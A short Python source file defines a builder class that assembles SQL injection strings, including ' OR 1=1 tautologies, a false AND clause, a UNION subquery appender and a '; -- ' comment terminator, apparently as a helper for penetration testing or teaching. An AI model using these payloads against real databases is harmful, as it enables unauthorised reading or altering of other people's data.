from io import StringIO


class SQLInjectionBuilder:
    def __init__(self) -> None:
        self.injection_string = StringIO()
        self.final_string = None

    def _add(self, new_str:str):
         return  self.injection_string.write(new_str)

    def build(self):
        self._add("; -- ")
        self.injection_string.getvalue()
        return self.injection_string.getvalue()
    
    def __str__(self) -> str:
        if self.final_string == None:
            return str(self.injection_string)
        else:
            return self.final_string

    def or_boolean_injection_quoted(self):
        self._add("' OR 1=\"1\"")

    def or_boolean_injection_unquoted(self):
        self._add("' OR 1=1")

    def false_and_boolean_injection(self) -> None:
        self._add("' AND 1=\"2\"")

    def union_injection(self, subquery: str) -> None:
        self._add(f" UNION {subquery}")
